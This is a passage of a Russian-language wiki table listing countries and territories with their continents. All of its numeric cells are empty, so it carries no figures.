|style="text-align:right"| ||Марокко|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гана|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Киргизия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Армения|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Алжир|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Швейцария|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Афганистан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Узбекистан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Венесуэла|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Азербайджан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Эфиопия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Молдавия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Кения|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сербия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Коста-Рика|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Непал|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ирландия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Австрия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Австралия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Австралия и Океания||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сальвадор|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Чехия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Камерун|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Государство Палестина|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Кот-д’Ивуар|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Босния и Герцеговина|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Южная Корея|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Дания|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Болгария|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мадагаскар|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Северная Македония|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Судан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сенегал|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Парагвай|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Замбия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Норвегия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ливан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Демократическая Республика Конго|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Малайзия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ливия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гвинея|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гвиана (департамент Франции)|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Габон|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Таджикистан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гаити|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Финляндия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Албания|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Люксембург|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Греция|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Хорватия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мавритания|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мальдивы|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Зимбабве|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Джибути|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Малави|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Венгрия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Экваториальная Гвинея|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Центральноафриканская Республика|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гонконг|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Намибия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Никарагуа|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Черногория|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Эсватини|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Республика Конго|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Куба|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Таиланд|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сомали|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Кабо-Верде|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Суринам|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Майотта|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Словакия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мозамбик|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Шри-Ланка|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мали|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
